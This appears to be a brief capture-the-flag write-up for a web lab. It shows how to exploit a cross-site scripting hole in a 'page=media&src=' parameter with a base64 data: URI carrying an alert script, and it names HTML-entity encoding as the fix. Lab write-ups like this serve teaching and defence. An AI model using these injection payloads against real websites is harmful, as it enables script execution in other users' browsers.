@@ -1,0 +1,16 @@
+How to get the flag :
+
+XSS : IP/?page=media&src=index.php
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs
+
+base64 <<< "<script> alert('hi'); </script>" : PHNjcmlwdD4gYWxlcnQoJ2hpJyk7IDwvc2NyaXB0Pgo=
+
+Go to IP/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD4gYWxlcnQoJ2hpJyk7IDwvc2NyaXB0Pgo=
+
+To test the XSS : IP/index.php?page=media&src=data:text/html,%3Cscript%3E%20alert(%27hi%27);%20%3C/script%3E
+
+
+How to solve XSS :
+
+Conversion of special characters to HTML entities
